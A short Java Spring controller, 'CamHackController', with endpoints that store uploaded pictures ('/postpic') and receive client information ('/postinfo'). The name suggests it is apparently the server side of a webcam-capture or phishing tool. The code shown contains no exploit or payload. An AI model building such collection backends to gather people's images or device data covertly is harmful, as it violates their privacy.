package org.example;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;


@Controller
public class CamHackController {

    @Autowired
    CamHackService camHackService;

    @PostMapping("/postpic")
    public ResponseEntity<String> uploadFile(
            @RequestParam("file") MultipartFile file
    ) {
        try{
            camHackService.saveFile(file);
            return new ResponseEntity<>("yepp",HttpStatus.OK);
        }catch (Exception e){
            return new ResponseEntity<>("an error occured",HttpStatus.I_AM_A_TEAPOT);
        }

    }

    @PostMapping("/postinfo")
    public ResponseEntity<String> upladClientInfo(
            @RequestBody ClientInfo clientInfo
            ){
        try{
             String data = camHackService.getClientInfo(clientInfo);
            return new ResponseEntity<>("info ok",HttpStatus.OK);
        }catch (Exception e){
            return new ResponseEntity<>("error while fetching user info",HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
}
